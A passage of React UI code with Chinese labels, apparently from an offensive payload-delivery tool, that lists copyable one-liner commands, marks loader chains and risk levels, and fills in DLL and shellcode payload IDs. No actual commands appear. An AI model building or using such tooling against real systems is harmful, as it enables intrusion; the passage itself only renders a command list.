            含 <code>&lt;DLL载荷ID&gt;</code> / <code>&lt;shellcode载荷ID&gt;</code> 的命令会用它替换；
            按 <code>dll</code> 格式构建的载荷会自动带上真实 ID。
          </span>
        )}
      </div>

      {visible.length === 0 && <p className="oneliner-hint">没有匹配的命令，换个关键字或切回「全部」。</p>}

      <div className="oneliner-variants">
        {visible.map((v) => {
          const level = riskOf(v.note)
          const loader = isLoader(v.note)
          return (
            <div className="oneliner-box" key={v.name}>
              <div className="oneliner-header">
                <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600, flexWrap: 'wrap' }}>
                  <Terminal size={14} /> {v.name}
                  {loader ? <Badge tone="accent">加载器链</Badge> : <Badge>直连</Badge>}
                  {level && <RiskBadge level={level} />}
                  <span className="oneliner-tag">{v.shell}</span>
                </span>
                <button className="oneliner-copy-btn" onClick={() => onCopy(fillIds(v.command))} title="复制该命令">
                  {copiedCmd === v.command ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                  {copiedCmd === v.command ? '已复制' : '复制'}
                </button>
              </div>
              <code className="oneliner-code">{fillIds(v.command)}</code>
              {v.desc && <p className="oneliner-hint">{v.desc}</p>}
              {/* 加载器链的前置条件与风险提示（服务端 note 字段，普通变体为空） */}
              {v.note && (
                <p className="oneliner-hint oneliner-note">
                  <AlertTriangle size={12} style={{ verticalAlign: '-2px', marginRight: 4 }} />
                  {v.note}
                </p>
              )}
            </div>
          )
        })}
      </div>
    </>
  )
}
